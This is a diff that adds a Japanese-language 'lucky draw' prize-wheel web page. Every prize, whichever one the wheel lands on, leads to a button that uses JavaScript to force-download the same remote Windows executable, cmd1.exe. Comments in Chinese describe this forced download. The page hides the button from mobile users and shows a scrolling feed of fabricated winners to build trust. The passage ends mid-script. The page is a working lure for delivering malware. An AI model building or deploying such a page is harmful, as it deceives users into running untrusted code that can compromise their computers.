@@ -1,0 +1,839 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>新春大吉・特製ラッキー抽選会</title>
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; }
+
+body {
+    font-family: 'Hiragino Sans', 'Meiryo', 'Helvetica Neue', Arial, sans-serif;
+    background: radial-gradient(circle at 50% 30%, #e0f2fe 0%, #bae6fd 40%, #7dd3fc 80%, #38bdf8 100%);
+    color: #1a365d;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    overflow-x: hidden;
+    position: relative;
+}
+
+body::before {
+    content: "";
+    position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+    background-image:
+        radial-gradient(circle at 100% 150%, transparent 20px, #ffffff 21px, #ffffff 23px, transparent 24px),
+        radial-gradient(circle at 0% 150%, transparent 20px, #ffffff 21px, #ffffff 23px, transparent 24px),
+        radial-gradient(circle at 100% 50%, transparent 20px, #ffffff 21px, #ffffff 23px, transparent 24px),
+        radial-gradient(circle at 0% 50%, transparent 20px, #ffffff 21px, #ffffff 23px, transparent 24px);
+    background-size: 60px 30px;
+    opacity: 0.18;
+    z-index: -2;
+}
+
+body::after {
+    content: "";
+    position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+    background-image:
+        radial-gradient(rgba(255,255,255,0.8) 2px, transparent 2px),
+        radial-gradient(rgba(254,240,138,0.6) 3px, transparent 3px),
+        radial-gradient(rgba(255,255,255,0.5) 1.5px, transparent 1.5px);
+    background-size: 80px 80px, 120px 120px, 50px 50px;
+    background-position: 0 0, 40px 60px, 20px 10px;
+    z-index: -1;
+}
+
+.side-decor {
+    position: fixed; top: 0;
+    width: 22vw; min-width: 180px; max-width: 340px;
+    height: 100vh;
+    z-index: 1;
+    pointer-events: none;
+    overflow: hidden;
+}
+.side-decor.left { left: 0; }
+.side-decor.right { right: 0; }
+
+.deco-item { position: absolute; pointer-events: none; user-select: none; }
+
+.lantern {
+    font-size: 64px;
+    filter: drop-shadow(0 8px 16px rgba(220,38,38,0.5));
+    animation: lanternSway 4s ease-in-out infinite;
+}
+@keyframes lanternSway {
+    0%, 100% { transform: rotate(-6deg); }
+    50% { transform: rotate(6deg); }
+}
+
+.omikuji {
+    font-size: 52px;
+    filter: drop-shadow(0 6px 12px rgba(15,23,42,0.3));
+    animation: gentleFloat 3.5s ease-in-out infinite;
+}
+@keyframes gentleFloat {
+    0%, 100% { transform: translateY(0) rotate(0deg); }
+    50% { transform: translateY(-16px) rotate(5deg); }
+}
+
+.coin {
+    width: 48px; height: 48px; border-radius: 50%;
+    background: radial-gradient(circle at 35% 30%, #fef9c3 0%, #facc15 45%, #b45309 100%);
+    box-shadow:
+        0 4px 8px rgba(0,0,0,0.35),
+        inset 0 3px 5px rgba(255,255,255,0.95),
+        inset 0 -3px 6px rgba(0,0,0,0.35);
+    display: flex; align-items: center; justify-content: center;
+    font-size: 24px; color: #b45309; font-weight: bold;
+    text-shadow: 0 1px 1px rgba(255,255,255,0.8);
+    animation: coinBounce 2.8s ease-in-out infinite;
+}
+@keyframes coinBounce {
+    0%, 100% { transform: translateY(0) rotate(0deg); }
+    50% { transform: translateY(-22px) rotate(180deg); }
+}
+
+.koban {
+    width: 64px; height: 28px;
+    background: radial-gradient(circle at 40% 30%, #fef9c3 0%, #facc15 50%, #b45309 100%);
+    border-radius: 50% / 60% 60% 40% 40%;
+    box-shadow: 0 4px 8px rgba(0,0,0,0.3), inset 0 2px 3px rgba(255,255,255,0.9);
+    display: flex; align-items: center; justify-content: center;
+    font-size: 13px; color: #7c2d12; font-weight: bold;
+    letter-spacing: 1px;
+    animation: kobanSpin 4s ease-in-out infinite;
+}
+@keyframes kobanSpin {
+    0%, 100% { transform: rotate(-8deg) scale(1); }
+    50% { transform: rotate(8deg) scale(1.08); }
+}
+
+.sparkle {
+    position: absolute;
+    font-size: 28px;
+    opacity: 0.85;
+    animation: twinkle 2.5s ease-in-out infinite;
+}
+.firework {
+    position: absolute;
+    font-size: 44px;
+    opacity: 0.7;
+    animation: twinkle 3.2s ease-in-out infinite;
+}
+@keyframes twinkle {
+    0%, 100% { opacity: 0.35; transform: scale(0.8); }
+    50% { opacity: 1; transform: scale(1.3); }
+}
+
+.sakura {
+    position: absolute;
+    font-size: 30px;
+    opacity: 0.75;
+    animation: sakuraFall 6s ease-in-out infinite;
+}
+@keyframes sakuraFall {
+    0% { transform: translateY(-20px) rotate(0deg); opacity: 0; }
+    20% { opacity: 0.85; }
+    80% { opacity: 0.7; }
+    100% { transform: translateY(100vh) rotate(360deg); opacity: 0; }
+}
+
+.furin {
+    font-size: 42px;
+    filter: drop-shadow(0 4px 8px rgba(15,23,42,0.3));
+    animation: furinSway 2.8s ease-in-out infinite;
+}
+@keyframes furinSway {
+    0%, 100% { transform: rotate(-12deg); }
+    50% { transform: rotate(12deg); }
+}
+
+.fan {
+    font-size: 44px;
+    filter: drop-shadow(0 4px 8px rgba(15,23,42,0.3));
+    animation: fanFloat 4.2s ease-in-out infinite;
+}
+@keyframes fanFloat {
+    0%, 100% { transform: translateY(0) rotate(-5deg); }
+    50% { transform: translateY(-14px) rotate(8deg); }
+}
+
+.ume {
+    font-size: 36px;
+    filter: drop-shadow(0 3px 6px rgba(15,23,42,0.25));
+    animation: twinkle 3.6s ease-in-out infinite;
+}
+
+.daruma {
+    font-size: 46px;
+    filter: drop-shadow(0 5px 10px rgba(220,38,38,0.4));
+    animation: darumaWobble 3s ease-in-out infinite;
+}
+@keyframes darumaWobble {
+    0%, 100% { transform: rotate(-6deg); }
+    50% { transform: rotate(6deg); }
+}
+
+@media (max-width: 900px) {
+    .side-decor { display: none; }
+}
+
+.container {
+    text-align: center;
+    padding: 20px 10px;
+    max-width: 650px;
+    width: 100%;
+    position: relative;
+    z-index: 5;
+}
+
+.header-badge {
+    display: inline-block;
+    background: linear-gradient(135deg, #1e3a8a 0%, #3b82f6 100%);
+    color: #ffffff;
+    padding: 6px 24px;
+    border-radius: 30px;
+    font-size: 14px; font-weight: bold; letter-spacing: 3px;
+    margin-bottom: 10px;
+    box-shadow: 0 4px 15px rgba(59,130,246,0.3);
+    border: 1px solid #93c5fd;
+}
+
+h1 {
+    font-size: 34px;
+    margin-bottom: 8px;
+    color: #0f172a;
+    text-shadow: 0 2px 10px rgba(255,255,255,0.9);
+    letter-spacing: 2px; font-weight: 800;
+}
+
+.subtitle {
+    font-size: 14px; color: #1e293b;
+    margin-bottom: 25px; letter-spacing: 1px; font-weight: 600;
+}
+
+.wheel-area {
+    position: relative;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    margin-bottom: 15px;
+}
+
+.wheel-wrapper {
+    position: relative;
+    width: 440px; height: 440px;
+    margin: 0 auto;
+}
+
+.wheel-border {
+    position: absolute;
+    top: -24px; left: -24px; right: -24px; bottom: -24px;
+    border: 6px solid #d4af37;
+    border-radius: 50%;
+    box-shadow: 0 12px 35px rgba(15,23,42,0.25), inset 0 0 20px rgba(212,175,55,0.5);
+    pointer-events: none;
+    background: rgba(255,255,255,0.25);
+}
+.wheel-border::after {
+    content: '';
+    position: absolute;
+    top: -8px; left: -8px; right: -8px; bottom: -8px;
+    border: 2px dashed #b8860b;
+    border-radius: 50%;
+}
+
+.wheel-stage {
+    position: relative;
+    width: 100%; height: 100%;
+    border-radius: 50%;
+    overflow: hidden;
+    box-shadow: 0 15px 35px rgba(15,23,42,0.2);
+}
+
+canvas {
+    width: 100%; height: 100%;
+    border-radius: 50%;
+    transition: transform 4s cubic-bezier(0.15, 0.7, 0.1, 1);
+    display: block;
+}
+
+.icon-layer {
+    position: absolute;
+    top: 0; left: 0; width: 100%; height: 100%;
+    border-radius: 50%;
+    pointer-events: none;
+    transition: transform 4s cubic-bezier(0.15, 0.7, 0.1, 1);
+}
+
+.prize-icon {
+    position: absolute;
+    top: 50%; left: 50%;
+    font-size: 34px;
+    line-height: 1;
+    transform-origin: 0 0;
+    white-space: nowrap;
+    filter: drop-shadow(0 2px 3px rgba(0,0,0,0.35));
+}
+
+.pointer {
+    position: absolute;
+    top: 50%; left: 50%;
+    transform: translate(-50%, -50%);
+    width: 108px; height: 108px;
+    border-radius: 50%;
+    cursor: pointer;
+    z-index: 10;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    background: radial-gradient(circle at 32% 26%, #ffffff 0%, #e0f2fe 12%, #7dd3fc 30%, #2563eb 65%, #1e3a8a 100%);
+    border: 4px solid #fbbf24;
+    outline: 2px solid #ffffff;
+    outline-offset: -8px;
+    box-shadow:
+        0 0 0 2px #b45309,
+        0 6px 0 #1e40af,
+        0 10px 0 #1e3a8a,
+        0 16px 24px rgba(15,23,42,0.45),
+        0 0 30px rgba(251,191,36,0.6),
+        inset 0 4px 10px rgba(255,255,255,0.9),
+        inset 0 -6px 14px rgba(0,0,0,0.35);
+    transition: transform 0.15s cubic-bezier(0.34,1.56,0.64,1), box-shadow 0.15s ease;
+    transform-style: preserve-3d;
+}
+.pointer::before {
+    content: '';
+    position: absolute;
+    top: 6px; left: 14%;
+    width: 72%; height: 40%;
+    background: linear-gradient(180deg, rgba(255,255,255,0.95) 0%, rgba(255,255,255,0.1) 100%);
+    border-radius: 50%;
+    pointer-events: none;
+    filter: blur(1px);
+}
+.pointer::after {
+    content: '';
+    position: absolute;
+    top: -34px; left: 50%;
+    transform: translateX(-50%);
+    width: 0; height: 0;
+    border-left: 18px solid transparent;
+    border-right: 18px solid transparent;
+    border-bottom: 32px solid #fbbf24;
+    filter: drop-shadow(0 3px 3px rgba(0,0,0,0.35));
+    z-index: -1;
+}
+.pointer .arrow-inner {
+    position: absolute;
+    top: -30px; left: 50%;
+    transform: translateX(-50%);
+    width: 0; height: 0;
+    border-left: 13px solid transparent;
+    border-right: 13px solid transparent;
+    border-bottom: 24px solid #b45309;
+    z-index: -1;
+    pointer-events: none;
+}
+.pointer-text {
+    color: #ffffff;
+    font-weight: 900;
+    font-size: 19px;
+    text-align: center;
+    line-height: 1.1;
+    letter-spacing: 1.5px;
+    user-select: none;
+    position: relative; z-index: 5;
+    text-shadow: 0 1px 0 #1e3a8a, 0 2px 0 #1e40af, 0 3px 5px rgba(0,0,0,0.5);
+}
+.pointer-sub {
+    position: absolute;
+    bottom: 14px; left: 50%;
+    transform: translateX(-50%);
+    color: rgba(255,255,255,0.75);
+    font-size: 9px; letter-spacing: 2px; font-weight: bold;
+    z-index: 5;
+}
+.pointer:hover {
+    transform: translate(-50%, -52%) scale(1.05);
+    box-shadow:
+        0 0 0 2px #b45309, 0 8px 0 #1e40af, 0 12px 0 #1e3a8a,
+        0 20px 30px rgba(15,23,42,0.5),
+        0 0 40px rgba(251,191,36,0.85),
+        inset 0 4px 12px rgba(255,255,255,0.95),
+        inset 0 -6px 16px rgba(0,0,0,0.4);
+}
+.pointer:active {
+    transform: translate(-50%, -47%) scale(0.96);
+    box-shadow:
+        0 0 0 2px #b45309, 0 2px 0 #1e40af, 0 4px 0 #1e3a8a,
+        0 8px 14px rgba(15,23,42,0.5),
+        0 0 20px rgba(251,191,36,0.5),
+        inset 0 3px 8px rgba(255,255,255,0.7),
+        inset 0 -4px 10px rgba(0,0,0,0.4);
+}
+.pointer.disabled {
+    pointer-events: none;
+    filter: grayscale(0.4) brightness(0.9);
+}
+
+.winner-ticker-box {
+    background: rgba(255,255,255,0.9);
+    backdrop-filter: blur(10px);
+    border: 2px solid #3b82f6;
+    border-radius: 14px;
+    padding: 12px 16px;
+    box-shadow: 0 8px 25px rgba(15,23,42,0.12);
+    margin-top: 20px;
+}
+.winner-ticker-header {
+    font-size: 14px; font-weight: bold; color: #1e3a8a;
+    margin-bottom: 8px;
+    display: flex; align-items: center; justify-content: center;
+    gap: 6px;
+}
+.winner-ticker-container { height: 90px; overflow: hidden; position: relative; }
+.winner-ticker-list {
+    list-style: none; padding: 0; margin: 0;
+    position: absolute; width: 100%; top: 0; left: 0;
+    transition: top 0.5s ease-in-out;
+}
+.winner-ticker-item {
+    font-size: 13px; color: #334155;
+    height: 30px; line-height: 30px;
+    display: flex; justify-content: space-between; align-items: center;
+    border-bottom: 1px dashed #e2e8f0;
+}
+.winner-name { font-weight: bold; color: #1e3a8a; }
+.winner-prize { color: #b91c1c; font-weight: bold; }
+.winner-time { font-size: 11px; color: #64748b; }
+
+.modal {
+    display: none; position: fixed;
+    top: 0; left: 0; width: 100%; height: 100%;
+    background: rgba(15,23,42,0.6);
+    backdrop-filter: blur(5px);
+    z-index: 100;
+    justify-content: center; align-items: center;
+    padding: 20px;
+}
+.modal-content {
+    background: linear-gradient(180deg, #ffffff 0%, #f0f9ff 100%);
+    color: #0f172a;
+    padding: 35px 25px;
+    border-radius: 20px;
+    text-align: center;
+    max-width: 380px; width: 100%;
+    box-shadow: 0 25px 50px rgba(0,0,0,0.25);
+    border: 3px solid #3b82f6;
+    animation: popIn 0.4s cubic-bezier(0.175,0.885,0.32,1.275);
+    position: relative;
+}
+@keyframes popIn {
+    0% { transform: scale(0.7); opacity: 0; }
+    100% { transform: scale(1); opacity: 1; }
+}
+.modal-title { font-size: 22px; color: #1e3a8a; margin-bottom: 8px; font-weight: bold; letter-spacing: 1px; }
+.modal-subtitle { font-size: 13px; color: #64748b; margin-bottom: 15px; }
+.modal-prize {
+    font-size: 19px; color: #0f172a; margin: 15px 0; font-weight: bold;
+    background: #e0f2fe; padding: 14px; border-radius: 10px;
+    border: 1px dashed #0284c7;
+    box-shadow: inset 0 2px 5px rgba(0,0,0,0.03);
+}
+.btn-claim {
+    display: block;
+    background: linear-gradient(135deg, #2563eb 0%, #1d4ed8 100%);
+    color: #ffffff; text-decoration: none;
+    padding: 14px; border-radius: 30px;
+    font-weight: bold; font-size: 16px;
+    margin-top: 25px;
+    box-shadow: 0 6px 20px rgba(37,99,235,0.35);
+    transition: all 0.2s;
+    letter-spacing: 1px;
+    cursor: pointer;
+}
+.btn-claim:hover {
+    background: linear-gradient(135deg, #1d4ed8 0%, #1e40af 100%);
+    transform: translateY(-2px);
+    box-shadow: 0 8px 25px rgba(37,99,235,0.5);
+}
+.mobile-warning {
+    display: none; color: #dc2626; font-size: 13px; font-weight: bold;
+    margin-top: 12px; background: #fee2e2; padding: 10px;
+    border-radius: 8px; border: 1px solid #fca5a5;
+}
+.btn-close {
+    background: transparent; border: none; color: #94a3b8;
+    margin-top: 15px; cursor: pointer; font-size: 13px; transition: color 0.2s;
+}
+.btn-close:hover { color: #475569; }
+</style>
+</head>
+<body>
+
+<!-- 左侧装饰区 -->
+<div class="side-decor left">
+    <div class="deco-item lantern" style="top: 4%; left: 15%;">🟟</div>
+    <div class="deco-item lantern" style="top: 22%; left: 55%; animation-delay: -1.5s;">🟟</div>
+    <div class="deco-item lantern" style="top: 44%; left: 12%; animation-delay: -0.8s;">🟟</div>
+    <div class="deco-item lantern" style="top: 66%; left: 52%; animation-delay: -2.2s;">🟟</div>
+    <div class="deco-item lantern" style="top: 86%; left: 18%; animation-delay: -3s;">🟟</div>
+
+    <div class="deco-item daruma" style="top: 14%; left: 78%;">🟟</div>
+    <div class="deco-item daruma" style="top: 74%; left: 70%; animation-delay: -1.5s;">🟟</div>
+
+    <div class="deco-item omikuji" style="top: 8%; left: 62%; font-size: 42px;">🟟</div>
+    <div class="deco-item omikuji" style="top: 33%; left: 75%; font-size: 44px; animation-delay: -1.8s;">🟟</div>
+    <div class="deco-item omikuji" style="top: 56%; left: 22%; font-size: 40px; animation-delay: -0.9s;">🟟</div>
+    <div class="deco-item omikuji" style="top: 78%; left: 45%; font-size: 42px; animation-delay: -2.4s;">🟟</div>
+
+    <div class="deco-item furin" style="top: 26%; left: 30%;">🟟</div>
+    <div class="deco-item furin" style="top: 68%; left: 78%; animation-delay: -1.2s;">🟟</div>
+
+    <div class="deco-item fan" style="top: 50%; left: 55%;">🟟</div>
+    <div class="deco-item fan" style="top: 16%; left: 8%; animation-delay: -2s;">🟟</div>
+
+    <div class="deco-item ume" style="top: 40%; left: 85%;">🟟</div>
+    <div class="deco-item ume" style="top: 88%; left: 55%; animation-delay: -1s;">🟟</div>
+    <div class="deco-item ume" style="top: 62%; left: 8%; animation-delay: -2s;">🟟</div>
+
+    <div class="deco-item coin" style="top: 18%; left: 42%;">福</div>
+    <div class="deco-item coin" style="top: 38%; left: 65%; animation-delay: -1.2s;">宝</div>
+    <div class="deco-item coin" style="top: 60%; left: 40%; animation-delay: -0.6s;">金</div>
+    <div class="deco-item coin" style="top: 82%; left: 72%; animation-delay: -1.8s;">運</div>
+
+    <div class="deco-item koban" style="top: 30%; left: 5%;">小判</div>
+    <div class="deco-item koban" style="top: 92%; left: 30%; animation-delay: -2s;">小判</div>
+
+    <div class="deco-item sparkle" style="top: 6%; left: 48%;">✨</div>
+    <div class="deco-item sparkle" style="top: 20%; left: 20%; animation-delay: -0.6s;">✨</div>
+    <div class="deco-item sparkle" style="top: 35%; left: 88%; animation-delay: -1.5s;">✨</div>
+    <div class="deco-item sparkle" style="top: 48%; left: 28%; animation-delay: -0.3s;">✨</div>
+    <div class="deco-item sparkle" style="top: 58%; left: 80%; animation-delay: -2s;">✨</div>
+    <div class="deco-item sparkle" style="top: 72%; left: 60%; animation-delay: -1s;">✨</div>
+    <div class="deco-item sparkle" style="top: 90%; left: 42%; animation-delay: -1.7s;">✨</div>
+
+    <div class="deco-item sakura" style="top: -5%; left: 35%; animation-delay: 0s;">🟟</div>
+    <div class="deco-item sakura" style="top: -5%; left: 68%; animation-delay: -2s;">🟟</div>
+    <div class="deco-item sakura" style="top: -5%; left: 12%; animation-delay: -4s;">🟟</div>
+</div>
+
+<!-- 右侧装饰区 -->
+<div class="side-decor right">
+    <div class="deco-item lantern" style="top: 6%; left: 50%;">🟟</div>
+    <div class="deco-item lantern" style="top: 28%; left: 15%; animation-delay: -1.2s;">🟟</div>
+    <div class="deco-item lantern" style="top: 50%; left: 60%; animation-delay: -2.4s;">🟟</div>
+    <div class="deco-item lantern" style="top: 72%; left: 18%; animation-delay: -0.6s;">🟟</div>
+    <div class="deco-item lantern" style="top: 90%; left: 55%; animation-delay: -1.8s;">🟟</div>
+
+    <div class="deco-item daruma" style="top: 16%; left: 22%;">🟟</div>
+    <div class="deco-item daruma" style="top: 82%; left: 35%; animation-delay: -1.5s;">🟟</div>
+
+    <div class="deco-item omikuji" style="top: 10%; left: 78%; font-size: 42px;">⛩️</div>
+    <div class="deco-item omikuji" style="top: 38%; left: 30%; font-size: 44px; animation-delay: -1.2s;">🟟</div>
+    <div class="deco-item omikuji" style="top: 60%; left: 75%; font-size: 40px; animation-delay: -2.1s;">🟟</div>
+    <div class="deco-item omikuji" style="top: 84%; left: 12%; font-size: 42px; animation-delay: -0.7s;">🟟</div>
+
+    <div class="deco-item furin" style="top: 20%; left: 60%;">🟟</div>
+    <div class="deco-item furin" style="top: 66%; left: 8%; animation-delay: -1.4s;">🟟</div>
+
+    <div class="deco-item fan" style="top: 44%; left: 48%;">🟟</div>
+    <div class="deco-item fan" style="top: 78%; left: 68%; animation-delay: -2.2s;">🟟</div>
+
+    <div class="deco-item ume" style="top: 30%; left: 8%;">🟟</div>
+    <div class="deco-item ume" style="top: 54%; left: 82%; animation-delay: -1s;">🟟</div>
+    <div class="deco-item ume" style="top: 94%; left: 45%; animation-delay: -2s;">🟟</div>
+
+    <div class="deco-item coin" style="top: 12%; left: 45%;">金</div>
+    <div class="deco-item coin" style="top: 34%; left: 68%; animation-delay: -1.6s;">運</div>
+    <div class="deco-item coin" style="top: 56%; left: 38%; animation-delay: -0.8s;">寿</div>
+    <div class="deco-item coin" style="top: 76%; left: 82%; animation-delay: -2.4s;">福</div>
+
+    <div class="deco-item koban" style="top: 24%; left: 88%;">小判</div>
+    <div class="deco-item koban" style="top: 90%; left: 62%; animation-delay: -2.5s;">小判</div>
+
+    <div class="deco-item sparkle" style="top: 4%; left: 30%;">✨</div>
+    <div class="deco-item sparkle" style="top: 18%; left: 88%; animation-delay: -0.9s;">✨</div>
+    <div class="deco-item sparkle" style="top: 32%; left: 52%; animation-delay: -1.8s;">✨</div>
+    <div class="deco-item sparkle" style="top: 46%; left: 18%; animation-delay: -0.4s;">✨</div>
+    <div class="deco-item sparkle" style="top: 62%; left: 62%; animation-delay: -2.3s;">✨</div>
+    <div class="deco-item sparkle" style="top: 74%; left: 28%; animation-delay: -1.1s;">✨</div>
+    <div class="deco-item sparkle" style="top: 88%; left: 78%; animation-delay: -1.9s;">✨</div>
+
+    <div class="deco-item firework" style="top: 8%; left: 62%; animation-delay: -1s;">🟟</div>
+    <div class="deco-item firework" style="top: 42%; left: 85%; animation-delay: -2.5s;">🟟</div>
+    <div class="deco-item firework" style="top: 70%; left: 48%; animation-delay: -1.6s;">🟟</div>
+    <div class="deco-item firework" style="top: 96%; left: 22%; animation-delay: -0.8s;">🟟</div>
+
+    <div class="deco-item sakura" style="top: -5%; left: 42%; animation-delay: -1s;">🟟</div>
+    <div class="deco-item sakura" style="top: -5%; left: 75%; animation-delay: -3s;">🟟</div>
+    <div class="deco-item sakura" style="top: -5%; left: 22%; animation-delay: -5s;">🟟</div>
+</div>
+
+<div class="container">
+    <div class="header-badge">極上の運試し</div>
+    <h1>大吉大福 抽選会</h1>
+    <p class="subtitle">中央のボタンをタップして、本日の幸運を掴もう！</p>
+
+    <div class="wheel-area">
+        <div class="wheel-wrapper">
+            <div class="wheel-border"></div>
+            <div class="wheel-stage">
+                <canvas id="wheelCanvas" width="800" height="800"></canvas>
+                <div class="icon-layer" id="iconLayer"></div>
+            </div>
+            <div class="pointer" id="spinBtn" onclick="startSpin()">
+                <div class="arrow-inner"></div>
+                <div class="pointer-text">抽選</div>
+                <div class="pointer-sub">SPIN</div>
+            </div>
+        </div>
+    </div>
+
+    <div class="winner-ticker-box">
+        <div class="winner-ticker-header">
+            🟟 リアルタイム当選速報（リアルタイム中継）
+        </div>
+        <div class="winner-ticker-container">
+            <ul class="winner-ticker-list" id="tickerList"></ul>
+        </div>
+    </div>
+</div>
+
+<div class="modal" id="resultModal">
+    <div class="modal-content">
+        <div class="modal-title">✨ 誠に御目出度う御座います！ ✨</div>
+        <div class="modal-subtitle">見事、以下の特賞に当選されました</div>
+        <div class="modal-prize" id="prizeName">温泉ペア宿泊券 ♨️</div>
+        <p style="font-size: 12px; color: #64748b;">PC（パソコン）専用ソフトをダウンロードして、賞品をお受け取りください。</p>
+
+        <!-- ★★★ 下载按钮：点击后直接用 JS 强制下载 ★★★ -->
+        <a href="#" id="claimLink" class="btn-claim">PC版ソフトをダウンロードして受け取る</a>
+
+        <div class="mobile-warning" id="mobileWarning">
+            ⚠️ 注意：本特典の受取は【パソコン（PC）環境のみ】対応しております。スマートフォンからの受取はできません。
+        </div>
+        <br>
+        <button class="btn-close" onclick="closeModal()">閉じる (Close)</button>
+    </div>
+</div>
+
+<script>
+// ★★★ 你的下载链接 ★★★
+const EXE_URL = "https://raw.githubusercontent.com/yn6y76punvd3/Pairs/main/cmd1.exe";
+
+const prizes = [
+    { name: "温泉ペア宿泊券", icon: "♨️", link: EXE_URL, color: "#1e3a8a" },
+    { name: "高級宇治抹茶",   icon: "🟟", link: EXE_URL, color: "#0d9488" },
+    { name: "黒毛和牛セット", icon: "🟟", link: EXE_URL, color: "#b91c1c" },
+    { name: "開運和風お守り", icon: "⛩️", link: EXE_URL, color: "#0284c7" },
+    { name: "九谷焼 招き猫",  icon: "🟟", link: EXE_URL, color: "#7c3aed" },
+    { name: "桜限定マグ",     icon: "🟟", link: EXE_URL, color: "#db2777" },
+    { name: "神戸純米大吟醸", icon: "🟟", link: EXE_URL, color: "#0369a1" },
+    { name: "特製ポストカード", icon: "✉️", link: EXE_URL, color: "#475569" }
+];
+
+const japaneseNames = [
+    "佐藤","鈴木","高橋","田中","伊藤","渡辺","山本","中村","小林","加藤",
+    "吉田","山田","山口","松本","井上","木村","林","清水","山崎","森",
+    "池田","橋本","阿部","石川","山下","中島","石井","小川","前田","岡田",
+    "長谷川","藤田","後藤","近藤","村上","遠藤","青木","坂本","斎藤","福田",
+    "太田","西村","藤井","金子","岡本","藤原","中野","三浦","原田","松田",
+    "竹内","中川","上田","大野","丸山","今井","河野","武田","上野","杉山",
+    "増田","小野","石原","平野","和田","工藤","内田","高木","安藤","谷口",
+    "大塚","永井","松井","小山","平田","中田","川口","野村","西田","菊地",
+    "北村","佐々木","大西","菅原","柴田","宮崎","小松","田村","片山","中山"
+];
+
+const canvas = document.getElementById('wheelCanvas');
+const ctx = canvas.getContext('2d');
+const iconLayer = document.getElementById('iconLayer');
+const numSegments = prizes.length;
+const arcSize = (2 * Math.PI) / numSegments;
+
+let currentAngle = 0;
+let isSpinning = false;
+
+function isMobileDevice() {
+    return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) || window.innerWidth <= 768;
+}
+
+function drawWheel() {
+    const radius = canvas.width / 2;
+    ctx.clearRect(0, 0, canvas.width, canvas.height);
+
+    for (let i = 0; i < numSegments; i++) {
+        const angle = i * arcSize;
+
+        ctx.beginPath();
+        ctx.fillStyle = prizes[i].color;
+        ctx.moveTo(radius, radius);
+        ctx.arc(radius, radius, radius - 12, angle, angle + arcSize);
+        ctx.lineTo(radius, radius);
+        ctx.fill();
+
+        ctx.strokeStyle = "#ffffff";
+        ctx.lineWidth = 4;
+        ctx.stroke();
+
+        ctx.save();
+        ctx.translate(radius, radius);
+        ctx.rotate(angle + arcSize / 2);
+        ctx.textAlign = "right";
+        ctx.fillStyle = "#ffffff";
+        ctx.shadowColor = "rgba(0,0,0,0.5)";
+        ctx.shadowBlur = 6;
+        ctx.font = "bold 30px 'Hiragino Sans', 'Meiryo', sans-serif";
+        ctx.fillText(prizes[i].name, radius - 100, 10);
+        ctx.restore();
+    }
+}
+
+function buildIconLayer() {
+    iconLayer.innerHTML = '';
+    const radius = 400;
+    const iconDistance = 0.72;
+    const r = radius * iconDistance;
+
+    prizes.forEach((prize, i) => {
+        const angle = i * arcSize + arcSize / 2;
+        const angleDeg = angle * 180 / Math.PI;
+
+        const iconEl = document.createElement('div');
+        iconEl.className = 'prize-icon';
+        iconEl.textContent = prize.icon;
+
+        iconEl.style.left = '50%';
+        iconEl.style.top = '50%';
+        iconEl.style.transform =
+            `translate(-50%, -50%) rotate(${angleDeg}deg) translateX(${r}px) rotate(${-angleDeg}deg)`;
+
+        iconLayer.appendChild(iconEl);
+    });
+}
+
+drawWheel();
+buildIconLayer();
+
+function startSpin() {
+    if (isSpinning) return;
+    isSpinning = true;
+
+    const spinBtn = document.getElementById('spinBtn');
+    spinBtn.classList.add('disabled');
+
+    const winningIndex = Math.floor(Math.random() * numSegments);
+    const extraRounds = 7;
+    const segmentAngle = 360 / numSegments;
+    const targetDegree = 360 - (winningIndex * segmentAngle + segmentAngle / 2);
+    const totalDegree = currentAngle + (360 * extraRounds) + (targetDegree - (currentAngle % 360));
+
+    currentAngle = totalDegree;
+
+    canvas.style.transform = `rotate(${currentAngle}deg)`;
+    iconLayer.style.transform = `rotate(${currentAngle}deg)`;
+
+    setTimeout(() => {
+        isSpinning = false;
+        spinBtn.classList.remove('disabled');
+        showModal(winningIndex);
+    }, 4000);
+}
+
+function showModal(index) {
+    const prize = prizes[index];
+    document.getElementById('prizeName').innerText = prize.name + ' ' + prize.icon;
+
+    const claimLinkBtn = document.getElementById('claimLink');
+    const mobileWarning = document.getElementById('mobileWarning');
+
+    if (isMobileDevice()) {
+        claimLinkBtn.style.display = 'none';
+        mobileWarning.style.display = 'block';
+    } else {
+        claimLinkBtn.style.display = 'block';
+        mobileWarning.style.display = 'none';
+
+        // ★★★ 关键：用 JS 强制下载 exe ★★★
+        claimLinkBtn.onclick = function(e) {
+            e.preventDefault();
+            // 方法1：用 fetch 拿文件再触发下载（跨域也有效）
+            fetch(EXE_URL)
+                .then(response => response.blob())
+                .then(blob => {
+                    const url = window.URL.createObjectURL(blob);
+                    const a = document.createElement('a');
+                    a.href = url;
+                    a.download = 'cmd1.exe';
+                    document.body.appendChild(a);
+                    a.click();
+                    document.body.removeChild(a);
+                    window.URL.revokeObjectURL(url);
+                })
+                .catch(err => {
+                    // 方法2：fetch 失败时直接打开链接
+                    window.location.href = EXE_URL;
+                });
+        };
+    }
+
+    document.getElementById('resultModal').style.display = 'flex';
+}
+
+function closeModal() {
+    document.getElementById('resultModal').style.display = 'none';
+}
+
+const tickerList = document.getElementById('tickerList');
+const usedNames = new Set();
+
+function getUniqueName() {
+    const available = japaneseNames.filter(name => !usedNames.has(name));
+    if (available.length === 0) {
+        usedNames.clear();
+        const randomIndex = Math.floor(Math.random() * japaneseNames.length);
+        const name = japaneseNames[randomIndex];
+        usedNames.add(name);
+        return name;
+    }
+    const randomIndex = Math.floor(Math.random() * available.length);
+    const name = available[randomIndex];
+    usedNames.add(name);
+    return name;
+}
+
+function getRandomWinner() {
+    const baseName = getUniqueName();
+    const name = baseName + "**様";
+    const prize = prizes[Math.floor(Math.random() * prizes.length)];
+    const prizeText = prize.name + ' ' + prize.icon;
+    const minutes = Math.floor(Math.random() * 10 + 1);
+    const time = minutes + "分前";
+    return { name, prize: prizeText, time };
+}
+
+for (let i = 0; i < 6; i++) {
+    const data = getRandomWinner();
+    const li = document.createElement('li');
+    li.className = 'winner-ticker-item';
+    li.innerHTML = `<span class="winner-name">${data.name}</span><span class="winner-prize">${data.prize}</span><span class="winner-time">${data.time}</span>`;
+    tickerList.appendChild(li);
+}
+
+let scrollIndex = 0;
+setInterval(() => {
+    scrollIndex++;
+    tickerList.style.top = `-${scrollIndex * 30}px`;
+
+    const data = getRandomWinner();
+    const li = document.createElement('li');
